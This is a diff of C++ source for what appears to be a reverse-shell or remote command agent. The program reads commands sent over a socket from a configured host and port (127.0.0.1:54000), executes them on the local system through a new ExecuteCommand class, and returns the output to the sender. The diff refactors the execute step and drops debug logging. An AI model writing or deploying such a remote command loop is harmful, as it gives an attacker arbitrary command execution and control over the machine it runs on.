@@ -4,20 +4,14 @@
 */
 
 
-#include <iostream>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <unistd.h>
-#include <netdb.h>
-#include <arpa/inet.h>
-#include <string.h>
-#include <string>
-
-#include "utils.cpp"
+#include "utils.hpp"
+#include "ExecCommand.cpp"
 
 
 int port = 54000;
 std::string ipAddress = "127.0.0.1";
+
+ExecuteCommand cmd = ExecuteCommand();
 
 int main()
 {
@@ -48,14 +42,13 @@ int main()
         
         int bytesRecv = recv(sock, buffer, bufSize, 0);
         
-        /* HANDLE COMMANDS */
-        std::string command = std::string(buffer, bytesRecv);
-        std::cout << "[+] COMMAND > '" << command << "'" << std::endl;
-
-        // Execute command and return command output
-        std::string output = get_cmd_output(command);
-        std::cout << "[+] OUTPUT > " << output << std::endl;
+        /********* HANDLE COMMANDS ****************/
         
+        std::string command = std::string(buffer, bytesRecv);       
+        
+        // Execute command
+        
+        std::string output = cmd.exec(command);
         
         // Send command output
         int sendRes = send(sock, output.c_str(), output.size() + 1, 0);
